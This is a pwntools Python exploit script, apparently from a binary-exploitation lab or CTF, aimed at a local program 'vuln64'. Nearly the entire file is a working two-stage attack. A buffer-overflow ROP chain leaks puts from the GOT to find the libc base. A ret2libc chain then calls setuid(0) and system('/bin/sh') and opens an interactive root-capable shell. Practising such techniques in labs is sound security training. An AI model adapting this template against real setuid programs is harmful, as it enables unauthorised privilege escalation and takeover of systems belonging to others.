from pwn import *


context.arch = 'amd64' # set runtime variables in a global setting.

elf = ELF("./vuln64")
p = elf.process(["./vuln64" , "h"])

#pop_rdi = p64(0x4015bb)
#got_put = p64(0x404020)
#plt_put = p64(0x401040)

rop= ROP(elf)
rop.call(elf.plt['puts'], [elf.got['puts']]) #find puts in procedural link table, print mem address of GOT put
rop.call(elf.sym['helpCommand'])	#return to helpCommand function in program

offset = 56

payload = [
	b"A" * offset,
	rop.chain()

]

payload = b"".join(payload)
p.sendline(payload)
p.recvline()
p.recvline()
puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00")) #store unpack output and store in var. Perform strip
log.info(f"leaked puts@GLIBC found: {hex(puts)}" )


############################################Stage 2 Ret2libc#########################################

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = puts - libc.symbols["puts"]
log.info(f"libc base address: {hex(libc.address)}" )

binsh = next(libc.search(b"/bin/sh"))
rop.call(libc.sym.setuid, [0])
rop.call(libc.sym.system, [binsh])
rop.call(libc.sym.exit)

payload = [
	b"A" * offset,
	rop.chain()

]

payload = b"".join(payload)
p.sendline(payload)
p.recvline()

p.interactive()